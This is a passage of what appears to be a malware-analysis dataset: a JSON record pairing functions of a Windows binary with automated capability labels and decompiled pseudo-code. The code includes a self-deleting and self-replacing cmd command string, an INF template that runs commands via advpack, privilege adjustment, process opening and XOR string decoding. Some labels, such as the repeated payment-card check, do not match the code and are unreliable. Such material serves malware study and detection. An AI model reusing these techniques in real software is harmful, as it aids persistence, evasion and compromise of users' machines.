        "decompiled_code": "\nbool __fastcall fcn.00403bf8(int16_t *param_1, uint param_2)\n\n{\n    int16_t iVar1;\n    int32_t iVar2;\n    int16_t *piVar3;\n    uint *puVar4;\n    uint lpUrlComponents;\n    uint var_2ch;\n    uint var_28h;\n    \n    puVar4 = &lpUrlComponents;\n    for (iVar2 = 0x3c; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *puVar4 = 0;\n        puVar4 = puVar4 + 1;\n    }\n    lpUrlComponents = 0x3c;\n    var_28h = 0x104;\n    piVar3 = param_1;\n    do {\n        iVar1 = *piVar3;\n        piVar3 = piVar3 + 1;\n    } while (iVar1 != 0);\n    var_2ch = param_2;\n    iVar2 = (*_sym.imp.WINHTTP.dll_WinHttpCrackUrl)(param_1, piVar3 - (param_1 + 1) >> 1, 0, &lpUrlComponents);\n    return iVar2 != 0;\n}\n",
        "token_count": 268
    },
    "004068be": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __cdecl fcn.004068be(int32_t *arg_8h)\n\n{\n    char *pcVar1;\n    char cVar2;\n    int16_t iVar3;\n    code *pcVar4;\n    int16_t *piVar5;\n    int32_t iVar6;\n    int32_t iVar7;\n    uint uVar8;\n    int16_t *in_ECX;\n    int16_t *piVar9;\n    char **in_EDX;\n    int16_t *piVar10;\n    uint uVar11;\n    int16_t *piVar12;\n    char *pcVar13;\n    uint var_ch;\n    uint var_8h;\n    uint lpWideCharStr;\n    \n    uVar11 = 0;\n    piVar5 = fcn.004051e7();\n    pcVar4 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n    if (piVar5 != NULL) {\n        piVar10 = piVar5;\n        do {\n            iVar3 = *piVar10;\n            piVar10 = piVar10 + 1;\n        } while (iVar3 != 0);\n        piVar9 = piVar5;\n        do {\n            iVar3 = *piVar9;\n            piVar9 = piVar9 + 1;\n        } while (iVar3 != 0);\n        piVar12 = in_ECX;\n        do {\n            iVar3 = *piVar12;\n            piVar12 = piVar12 + 1;\n        } while (iVar3 != 0);\n        uVar11 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)\n                           (8, ((piVar12 - (in_ECX + 1) >> 1) + (piVar9 - (piVar5 + 1) >> 1) +\n                               (piVar10 - (piVar5 + 1) >> 1)) * 2 + 0x140);\n        iVar6 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar11);\n        (*_sym.imp.USER32.dll_wsprintfW)\n                  (iVar6, \n                   L\"[Version]\\r\\nsignature = \\\"$CHICAGO$\\\"\\r\\nAdvancedINF = 2.5, \\\"You need a new version of advpack.dll\\\"\\r\\n\\r\\n[DefaultInstall]\\r\\nRunPreSetupCommands = %s:2\\r\\n\\r\\n[%s]\\r\\n%s\\r\\n\"\n                   , piVar5, piVar5, in_ECX);\n        if (iVar6 == 0) {\n            pcVar13 = NULL;\n        }\n        else {\n            iVar7 = (*_sym.imp.KERNEL32.dll_lstrlenW)(iVar6);\n            iVar7 = iVar7 * 2 + 2;\n            uVar11 = (*pcVar4)(8, iVar7);\n            pcVar13 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar11);\n            *pcVar13 = '\\0';\n            (*_sym.imp.KERNEL32.dll_WideCharToMultiByte)(0, 0, iVar6, 0xffffffff, pcVar13, iVar7, 0, 0);\n        }\n        pcVar1 = pcVar13 + 1;\n        *in_EDX = pcVar13;\n        do {\n            cVar2 = *pcVar13;\n            pcVar13 = pcVar13 + 1;\n        } while (cVar2 != '\\0');\n        *arg_8h = pcVar13 - pcVar1;\n        uVar11 = 1;\n        uVar8 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, piVar5);\n        (*_sym.imp.KERNEL32.dll_HeapFree)(uVar8);\n    }\n    return uVar11;\n}\n",
        "token_count": 804
    },
    "00408946": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "terminate thread"
        ],
        "decompiled_code": "\nvoid fcn.00408946(void)\n\n{\n    uint32_t uVar1;\n    \n    uVar1 = 0;\n    do {\n        (*_sym.imp.KERNEL32.dll_TerminateThread)(*(uVar1 + 0x41db70), 0);\n        (*_sym.imp.KERNEL32.dll_CloseHandle)(*(uVar1 + 0x41db70));\n        uVar1 = uVar1 + 4;\n    } while (uVar1 < 0x40);\n    return;\n}\n",
        "token_count": 113
    },
    "004091c0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.004091c0(int32_t param_1, uint param_2)\n\n{\n    int32_t iVar1;\n    uint32_t uVar2;\n    int32_t iVar3;\n    int32_t *piVar4;\n    uint16_t *puVar5;\n    uint var_14h;\n    uint var_10h;\n    uint lpString2;\n    uint32_t var_8h;\n    uint var_4h;\n    \n    iVar3 = fcn.004092ad();\n    if (((iVar3 != 0) && (iVar1 = *(iVar3 + 0x1c),  iVar1 != 0)) && (*(iVar3 + 0x20) != 0)) {\n        var_8h = 0;\n        uVar2 = *(iVar3 + 0x18);\n        puVar5 = *(iVar3 + 0x24) + param_1;\n        piVar4 = *(iVar3 + 0x20) + param_1;\n        if (uVar2 != 0) {\n            do {\n                iVar3 = (*_sym.imp.KERNEL32.dll_lstrcmpA)(*piVar4 + param_1, param_2);\n                if (iVar3 == 0) {\n                    return iVar1 + param_1 + *puVar5 * 4;\n                }\n                puVar5 = puVar5 + 1;\n                piVar4 = piVar4 + 1;\n                var_8h = var_8h + 1;\n            } while (var_8h < uVar2);\n        }\n    }\n    return 0;\n}\n",
        "token_count": 353
    },
    "00409246": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a",
            "encrypt data using RC4 KSA/41e5dbd1fcbf406ebac8c999dfc1b5ff",
            "contain loop"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.00409246(int32_t param_1, uint32_t param_2)\n\n{\n    int16_t iVar1;\n    int32_t iVar2;\n    uint var_8h;\n    uint var_4h;\n    \n    param_1 = *(param_1 + 0x3c) + param_1;\n    iVar1 = *(param_1 + 6);\n    iVar2 = param_1 + 0x18 + *(param_1 + 0x14);\n    while ((param_2 < *(iVar2 + 0xc) ||\n           ((*(param_1 + 0x3c) + -1 + *(iVar2 + 0x10) & ~(*(param_1 + 0x3c) - 1U)) + *(iVar2 + 0xc) <= param_2))) {\n        iVar1 = iVar1 + -1;\n        iVar2 = iVar2 + 0x28;\n        if (iVar1 == 0) {\n            return 0;\n        }\n    }\n    return (*(iVar2 + 0x14) - *(iVar2 + 0xc)) + param_2;\n}\n",
        "token_count": 254
    },
    "004092ad": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.004092ad(int32_t param_1)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = *(param_1 + 0x3c);\n    if (*(iVar1 + 4 + param_1) == -0x799c) {\n        iVar1 = *(iVar1 + 0x88 + param_1);\n    }\n    else {\n        iVar1 = *(iVar1 + 0x78 + param_1);\n    }\n    return iVar1 + param_1;\n}\n",
        "token_count": 115
    },
    "004092cc": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __fastcall fcn.004092cc(int32_t param_1, int32_t param_2)\n\n{\n    int32_t iVar1;\n    uint32_t uVar2;\n    uint *puVar3;\n    uchar *puVar4;\n    uint var_414h;\n    int32_t var_14h;\n    int32_t var_10h;\n    int32_t var_ch;\n    int32_t var_8h;\n    uint var_1h;\n    \n    var_10h = param_1;\n    var_14h = param_2;\n    var_8h = 0;\n    uVar2 = 0;\n    var_1h._0_1_ = 0x22;\n    var_ch = 0;\n    if (0 < param_2) {\n        do {\n            if (0x3ff < uVar2) {\n                iVar1 = var_8h + uVar2;\n                puVar3 = &var_414h;\n                puVar4 = var_8h + param_1;\n                for (; uVar2 != 0; uVar2 = uVar2 - 1) {\n                    *puVar4 = *puVar3;\n                    puVar3 = puVar3 + 1;\n                    puVar4 = puVar4 + 1;\n                }\n                uVar2 = 0;\n                var_8h = iVar1;\n                param_1 = var_10h;\n                param_2 = var_14h;\n            }\n            *(&var_414h + uVar2) = *(var_ch + param_1) ^ var_1h;\n            uVar2 = uVar2 + 1;\n            var_1h._0_1_ = var_1h + (var_ch % 0x85) * '\\x03';\n            var_ch = var_ch + 1;\n        } while (var_ch < param_2);\n        if (uVar2 != 0) {\n            puVar3 = &var_414h;\n            puVar4 = var_8h + param_1;\n            for (; uVar2 != 0; uVar2 = uVar2 - 1) {\n                *puVar4 = *puVar3;\n                puVar3 = puVar3 + 1;\n                puVar4 = puVar4 + 1;\n            }\n        }\n    }\n    return;\n}\n",
        "token_count": 544
    },
    "004095af": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __fastcall fcn.004095af(int32_t param_1)\n\n{\n    int32_t iVar1;\n    uint32_t uVar2;\n    uint *puVar3;\n    uchar *puVar4;\n    uint var_410h;\n    int32_t var_10h;\n    int32_t var_ch;\n    int32_t var_8h;\n    uint var_1h;\n    \n    var_10h = param_1;\n    uVar2 = 0;\n    var_8h = 0;\n    var_1h._0_1_ = 0x22;\n    var_ch = 0;\n    do {\n        if (0x3ff < uVar2) {\n            iVar1 = var_8h + uVar2;\n            puVar3 = &var_410h;\n            puVar4 = var_8h + param_1;\n            for (; uVar2 != 0; uVar2 = uVar2 - 1) {\n                *puVar4 = *puVar3;\n                puVar3 = puVar3 + 1;\n                puVar4 = puVar4 + 1;\n            }\n            uVar2 = 0;\n            var_8h = iVar1;\n            param_1 = var_10h;\n        }\n        *(&var_410h + uVar2) = *(var_ch + param_1) ^ var_1h;\n        uVar2 = uVar2 + 1;\n        var_1h._0_1_ = var_1h + (var_ch % 0x85) * '\\x03';\n        var_ch = var_ch + 1;\n    } while (var_ch < 0x184);\n    if (uVar2 != 0) {\n        puVar3 = &var_410h;\n        puVar4 = var_8h + param_1;\n        for (; uVar2 != 0; uVar2 = uVar2 - 1) {\n            *puVar4 = *puVar3;\n            puVar3 = puVar3 + 1;\n            puVar4 = puVar4 + 1;\n        }\n    }\n    return;\n}\n",
        "token_count": 497
    },
    "00409bd3": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint16_t * __fastcall fcn.00409bd3(int16_t *param_1, int16_t param_2)\n\n{\n    int16_t *piVar1;\n    \n    piVar1 = NULL;\n    while( true ) {\n        if (*param_1 == param_2) {\n            piVar1 = param_1;\n        }\n        if (*param_1 == 0) break;\n        param_1 = param_1 + 1;\n    }\n    return piVar1;\n}\n",
        "token_count": 109
    },
    "00409bed": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint16_t * __cdecl fcn.00409bed(int16_t **arg_8h)\n\n{\n    int16_t iVar1;\n    int16_t iVar2;\n    int16_t *piVar3;\n    int16_t *piVar4;\n    int16_t *in_ECX;\n    int16_t *piVar5;\n    int16_t *piVar6;\n    \n    if (in_ECX == NULL) {\n        in_ECX = *arg_8h;\n        if (in_ECX == NULL) {\n            return in_ECX;\n        }\n    }\n    do {\n        piVar3 = in_ECX;\n        piVar5 = 0x4117cc;\n        do {\n            iVar1 = *piVar5;\n            piVar5 = piVar5 + 1;\n            if (iVar1 == 0) {\n                piVar5 = piVar3 + 1;\n                if (*piVar3 == 0) {\n                    *arg_8h = NULL;\n                    return NULL;\n                }\n                do {\n                    piVar4 = piVar5;\n                    iVar1 = *piVar4;\n                    piVar6 = 0x4117cc;\n                    do {\n                        iVar2 = *piVar6;\n                        piVar6 = piVar6 + 1;\n                        if (iVar2 == iVar1) {\n                            if (iVar1 != 0) {\n                                *piVar4 = 0;\n                            }\n                            piVar5 = NULL;\n                            if (iVar1 != 0) {\n                                piVar5 = piVar4 + 1;\n                            }\n                            *arg_8h = piVar5;\n                            return piVar3;\n                        }\n                        piVar5 = piVar4 + 1;\n                    } while (iVar2 != 0);\n                } while( true );\n            }\n            in_ECX = piVar3 + 1;\n        } while (*piVar3 != iVar1);\n    } while( true );\n}\n",
        "token_count": 418
    },
    "00409c60": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint16_t * __fastcall fcn.00409c60(int16_t *param_1)\n\n{\n    int16_t iVar1;\n    \n    iVar1 = *param_1;\n    if (iVar1 != 0x3d) {\n        do {\n            if (iVar1 == 0) break;\n            param_1 = param_1 + 1;\n            iVar1 = *param_1;\n        } while (iVar1 != 0x3d);\n        if (*param_1 != 0x3d) {\n            return NULL;\n        }\n    }\n    return param_1;\n}\n",
        "token_count": 130
    },
    "0040b235": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0040b235(uint arg_8h)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    uint32_t arg_8h_00;\n    uchar *puVar5;\n    uint *puVar6;\n    uchar auStack48 [4];\n    uint uStack44;\n    uint uStack40;\n    uint uStack36;\n    uint uStack32;\n    uint uStack28;\n    uint uStack24;\n    \n    puVar5 = auStack48;\n    for (iVar2 = 0x10; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *puVar5 = 0;\n        puVar5 = puVar5 + 1;\n    }\n    iVar4 = 0;\n    arg_8h_00 = 0;\n    uStack40 = arg_8h;\n    iVar2 = (*_sym.imp.KERNEL32.dll_OpenProcess)(0x43a, 0, arg_8h);\n    if (iVar2 != 0) {\n        puVar6 = &uStack44;\n        for (iVar3 = 0x18; iVar3 != 0; iVar3 = iVar3 + -1) {\n            *puVar6 = 0;\n            puVar6 = puVar6 + 1;\n        }\n        uStack28 = 0x4400;\n        uStack44 = 0x413490;\n        uStack40 = 0;\n        uStack24 = 0x6200;\n        uStack36 = 0x417890;\n        uStack32 = 0;\n        (*_sym.imp.KERNEL32.dll_GetCurrentProcess)();\n        iVar3 = fcn.0040acf7();\n        if (iVar3 != 0) {\n            iVar3 = fcn.0040acf7();\n            arg_8h_00 = -(iVar3 != 0) & 0x10;\n        }\n        do {\n            iVar3 = fcn.00407051(arg_8h_00);\n            if (iVar3 == 0) break;\n            (*_sym.imp.KERNEL32.dll_Sleep)(0x32);\n            iVar4 = iVar4 + 1;\n        } while (iVar4 < 0x14);\n        pcVar1 = _sym.imp.KERNEL32.dll_CloseHandle;\n        (*_sym.imp.KERNEL32.dll_CloseHandle)(iVar2);\n        (*pcVar1)(iVar2);\n    }\n    return 0;\n}\n",
        "token_count": 547
    },
    "00403e76": {
        "rules": [
            "create or open registry key",
            "query or enumerate registry value"
        ],
        "decompiled_code": "\nuint32_t __fastcall fcn.00403e76(uint param_1, uint param_2)\n\n{\n    uint32_t uVar1;\n    bool bVar2;\n    uint lpType;\n    uint lpcbData;\n    uint namelen;\n    \n    namelen = 0;\n    uVar1 = (*_sym.imp.ADVAPI32.dll_RegCreateKeyA)(reloc.WS2_32.dll_bind, param_1, &namelen);\n    bVar2 = uVar1 == 0;\n    if (bVar2) {\n        lpType = 1;\n        lpcbData = 0x400;\n        (*_sym.imp.ADVAPI32.dll_RegQueryValueExA)(namelen, param_2, 0, &lpType, 0x41ddd8, &lpcbData);\n        uVar1 = (*_sym.imp.ADVAPI32.dll_RegCloseKey)(namelen);\n    }\n    return uVar1 & 0xffffff00 | bVar2;\n}\n",
        "token_count": 217
    },
    "0040d530": {
        "rules": [
            "check process job object/8aaf725824be4e7b84101cffc1f879ea",
            "open process"
        ],
        "decompiled_code": "\nbool __fastcall fcn.0040d530(uint param_1)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    uint uVar3;\n    int32_t iVar4;\n    \n    iVar4 = 0;\n    iVar1 = (*_sym.imp.KERNEL32.dll_OpenProcess)(0x400, 0, param_1);\n    if (iVar1 != 0) {\n        iVar2 = fcn.0040d20c();\n        if (iVar2 != 0) {\n            iVar4 = fcn.0040ca9b();\n            uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar2);\n            (*_sym.imp.KERNEL32.dll_HeapFree)(uVar3);\n        }\n        (*_sym.imp.KERNEL32.dll_CloseHandle)(iVar1);\n    }\n    return iVar4 == 0;\n}\n",
        "token_count": 191
    },
    "0040ea40": {
        "rules": [
            "delay execution"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0040ea40(uint32_t *arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    uint32_t uVar1;\n    uint32_t *puVar2;\n    int32_t iVar3;\n    uint in_EDX;\n    uint uVar4;\n    uint *arg_14h;\n    uint arg_18h;\n    uint var_8h;\n    uint var_4h;\n    \n    puVar2 = arg_8h;\n    arg_14h = &var_4h;\n    uVar4 = 0;\n    arg_18h = arg_10h;\ncode_r0x0040ea9d:\n    do {\n        puVar2[1] = 0;\n        *puVar2 = 0;\n        var_4h = 0;\n        arg_8h = NULL;\n        iVar3 = fcn.0040e75a(in_EDX, 0, &arg_8h, arg_14h, arg_18h);\n        if ((iVar3 != 0) || (arg_8h == NULL)) {\ncode_r0x0040eab5:\n            fcn.00409a4e();\n            goto code_r0x0040eabc;\n        }\n        uVar1 = *puVar2;\n        if (uVar1 < arg_8h) {\n            (*_sym.imp.KERNEL32.dll_Sleep)(10000);\n            fcn.00409a4e();\n            goto code_r0x0040ea9d;\n        }\n        if (uVar1 < 5) goto code_r0x0040eab5;\n        if (*puVar2[1] == uVar1) {\ncode_r0x0040eabc:\n            if (*puVar2 == 0) {\n                (*_sym.imp.KERNEL32.dll_OutputDebugStringA)(\"WMA 2\");\n            }\n            else if (puVar2[1] != 0) {\n                fcn.004102a1();\n                iVar3 = fcn.0040eb15(arg_ch);\n                if (iVar3 != 0) {\n                    (*_sym.imp.KERNEL32.dll_OutputDebugStringA)(\"WMA 1\");\n                    fcn.00409a4e();\n                    (*_sym.imp.KERNEL32.dll_SetEvent)(*0x41daa4);\n                    uVar4 = 1;\n                }\n            }\n            return uVar4;\n        }\n    } while( true );\n}\n",
        "token_count": 537
    },
    "0040f21e": {
        "rules": [
            "delay execution"
        ],
        "decompiled_code": "\nuint fcn.0040f21e(void)\n\n{\n    int32_t iVar1;\n    \n    while( true ) {\n        iVar1 = fcn.0040f6b7();\n        if (iVar1 != 0) break;\n        (*_sym.imp.KERNEL32.dll_Sleep)(5000);\n    }\n    fcn.0040f1d6();\n    return 0;\n}\n",
        "token_count": 86
    },
    "00409690": {
        "rules": [
            "create process on Windows"
        ],
        "decompiled_code": "\nuint fcn.00409690(void)\n\n{\n    code *pcVar1;\n    code *pcVar2;\n    int32_t iVar3;\n    uint uVar4;\n    uint var_85ch;\n    uint lpString1;\n    uint lpFilename;\n    uint pExecInfo;\n    uint var_38h;\n    uint var_34h;\n    char16_t *var_30h;\n    uint *var_2ch;\n    uint *var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint hProcess;\n    \n    iVar3 = (*_sym.imp.KERNEL32.dll_GetModuleFileNameW)(0, &lpFilename, 0x104);\n    if ((iVar3 != 0) &&\n       (iVar3 = (*_sym.imp.KERNEL32.dll_GetEnvironmentVariableW)(L\"COMSPEC\", &var_85ch, 0x104),  iVar3 != 0)) {\n        (*_sym.imp.KERNEL32.dll_lstrcpyW)(&lpString1, L\"/c ping localhost -n 4 & del /F /Q \\\"\");\n        pcVar1 = _sym.imp.KERNEL32.dll_lstrcatW;\n        (*_sym.imp.KERNEL32.dll_lstrcatW)(&lpString1, &lpFilename);\n        (*pcVar1)(&lpString1, L\"\\\" > nul\");\n        (*pcVar1)(&lpString1, L\"& move /Y \\\"\");\n        (*pcVar1)(&lpString1, &lpFilename);\n        (*pcVar1)(&lpString1, L\".update\\\" \\\"\");\n        (*pcVar1)(&lpString1, &lpFilename);\n        (*pcVar1)(&lpString1, L\"\\\" > nul & \\\"\");\n        (*pcVar1)(&lpString1, &lpFilename);\n        (*pcVar1)(&lpString1, 0x41191c);\n        var_2ch = &var_85ch;\n        pExecInfo = 0x3c;\n        var_28h = &lpString1;\n        var_34h = 0;\n        var_30h = L\"Open\";\n        var_24h = 0;\n        var_20h = 0;\n        var_38h = 0x40;\n        uVar4 = (*_sym.imp.KERNEL32.dll_GetCurrentProcess)(0x100);\n        pcVar2 = _sym.imp.KERNEL32.dll_SetPriorityClass;\n        (*_sym.imp.KERNEL32.dll_SetPriorityClass)(uVar4);\n        pcVar1 = _sym.imp.KERNEL32.dll_GetCurrentThread;\n        uVar4 = (*_sym.imp.KERNEL32.dll_GetCurrentThread)(0xf);\n        (*_sym.imp.KERNEL32.dll_SetThreadPriority)(uVar4);\n        (*_sym.imp.ole32.dll_CoInitializeEx)(0, 6);\n        iVar3 = (*_sym.imp.SHELL32.dll_ShellExecuteExW)(&pExecInfo);\n        if (iVar3 != 0) {\n            (*pcVar2)(hProcess, 0x40);\n            (*_sym.imp.KERNEL32.dll_SetProcessPriorityBoost)(hProcess, 1);\n            (*_sym.imp.SHELL32.dll_SHChangeNotify)(4, 5, &lpFilename, 0);\n            return 1;\n        }\n        uVar4 = (*_sym.imp.KERNEL32.dll_GetCurrentProcess)(0x20);\n        (*pcVar2)(uVar4);\n        uVar4 = (*pcVar1)(0);\n        (*_sym.imp.KERNEL32.dll_SetThreadPriority)(uVar4);\n    }\n    return 0;\n}\n",
        "token_count": 788
    },
    "00401000": {
        "rules": [
            "delete file"
        ],
        "decompiled_code": "\nuint __fastcall fcn.00401000(int32_t param_1)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    uint uVar3;\n    uint uVar4;\n    \n    // [00] -r-x section size 65536 named .text\n    uVar4 = 0;\n    iVar1 = fcn.004010f5();\n    if (iVar1 != 0) {\n        param_1 = iVar1;\n    }\n    iVar2 = (*_sym.imp.KERNEL32.dll_DeleteFileW)(param_1);\n    if (iVar2 == 0) {\n        uVar4 = fcn.00402ac8();\n    }\n    if (iVar1 != 0) {\n        uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar1);\n        (*_sym.imp.KERNEL32.dll_HeapFree)(uVar3);\n    }\n    return uVar4;\n}\n",
        "token_count": 205
    },
    "004010f5": {
        "rules": [
            "query environment variable"
        ],
        "decompiled_code": "\nuchar * __fastcall fcn.004010f5(int32_t param_1)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    int32_t iVar3;\n    uchar *puVar4;\n    uchar *puVar5;\n    uint nSize;\n    uint var_4h;\n    \n    puVar4 = NULL;\n    if ((param_1 != 0) && (iVar1 = (*_sym.imp.KERNEL32.dll_ExpandEnvironmentStringsW)(param_1, 0, 0),  iVar1 != 0)) {\n        iVar3 = iVar1 * 2 + 8;\n        uVar2 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, iVar3);\n        puVar4 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar2);\n        puVar5 = puVar4;\n        if (puVar4 != NULL) {\n            for (; iVar3 != 0; iVar3 = iVar3 + -1) {\n                *puVar5 = 0;\n                puVar5 = puVar5 + 1;\n            }\n            iVar1 = (*_sym.imp.KERNEL32.dll_ExpandEnvironmentStringsW)(param_1, puVar4, iVar1);\n            if (iVar1 == 0) {\n                uVar2 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, puVar4);\n                (*_sym.imp.KERNEL32.dll_HeapFree)(uVar2);\n                puVar4 = NULL;\n            }\n        }\n    }\n    return puVar4;\n}\n",
        "token_count": 337
    },
    "00409991": {
        "rules": [
            "modify access privileges"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.00409991(uint param_1, int32_t param_2)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    uint uVar3;\n    uint NewState;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint lpLuid;\n    uint var_8h;\n    int32_t TokenHandle;\n    \n    TokenHandle = param_2;\n    if (param_2 == 0) {\n        uVar3 = (*_sym.imp.KERNEL32.dll_GetCurrentProcess)(0x28, &TokenHandle);\n        iVar2 = (*_sym.imp.ADVAPI32.dll_OpenProcessToken)(uVar3);\n        if (iVar2 != 0) {\n            iVar1 = (*_sym.imp.ADVAPI32.dll_LookupPrivilegeValueA)(0, param_1, &lpLuid);\n            iVar2 = 0;\n            if (iVar1 != 0) {\n                var_18h = lpLuid;\n                var_14h = var_8h;\n                NewState = 1;\n                var_10h = 2;\n                iVar2 = (*_sym.imp.ADVAPI32.dll_AdjustTokenPrivileges)(TokenHandle, 0, &NewState, 0x10, 0, 0);\n            }\n            (*_sym.imp.KERNEL32.dll_CloseHandle)(TokenHandle);\n        }\n    }\n    else {\n        iVar1 = (*_sym.imp.ADVAPI32.dll_LookupPrivilegeValueA)(0, param_1, &lpLuid);\n        iVar2 = 0;\n        if (iVar1 != 0) {\n            var_18h = lpLuid;\n            var_14h = var_8h;\n            NewState = 1;\n            var_10h = 2;\n            iVar2 = (*_sym.imp.ADVAPI32.dll_AdjustTokenPrivileges)(TokenHandle, 0, &NewState, 0x10, 0, 0);\n        }\n    }\n    return iVar2;\n}\n",
        "token_count": 451
    }
}